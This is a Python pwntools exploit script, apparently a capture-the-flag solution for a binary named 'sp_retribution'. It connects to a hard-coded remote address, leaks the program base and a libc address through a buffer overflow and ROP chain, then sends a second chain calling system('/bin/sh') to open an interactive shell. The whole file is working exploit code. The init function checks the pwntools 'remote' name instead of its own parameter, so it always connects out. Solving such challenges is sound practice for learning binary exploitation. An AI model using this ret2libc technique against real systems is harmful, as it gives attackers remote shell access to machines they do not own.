from pwn import *
import re

local_path = "sp_retribution"

pty = process.PTY
elf = context.binary = ELF(local_path)

libc = ELF("glibc/libc-2.23.so")

def init(rem=False):
    if remote:
        io = remote("167.172.50.34", 31933)
    else:
        io = process(elf.path, stdin=pty, stdout=pty)

    return io

offset = 88

io = init(True)

io.recvuntil(b">> ")
io.sendline(b"2")
io.recvuntil(b"y = ")
io.sendline(b"")
data = io.recvuntil(b"(y/n): ")

base = data.split(b"\n")[-2]
base = u32(base[1:]) << 16
print(f"current elf base: 0x{base:02x}")

pop_rdi_ret = 0x0d33
# 202fa8 <read@GLIBC_2.2.5>
got_read = 0x202fa8
puts = 0x760
return_to_func = 0x0c98

chain = b'A'*offset
chain += p64(base + pop_rdi_ret)
chain += p64(base + got_read)
chain += p64(base + puts)
chain += p64(base + return_to_func)

io.sendline(chain)
io.recvuntil(b"eset!\x1b[1;34m\n")

libc_read = u64(io.recv(6) + b'\x00\x00')
print("leaked read addr: %s"%hex(libc_read))

# sub read base address from obs to get libc base
libc_base = libc_read - 0x0f7350

print(f"libc base: 0x{libc_base:02x}")

system = libc_base + 0x0453a0 # libcbase + system
bin_sh = libc_base + 0x18ce57 # libcbase + "/bin/sh"

io.recvuntil(b'y = ')
io.sendline(b'')
io.recvuntil(b'(y/n): ')

chain = b'A'*offset
chain += p64(base + pop_rdi_ret)
chain += p64(bin_sh)
chain += p64(system)
print("shell...")
io.sendline(chain)
io.interactive()

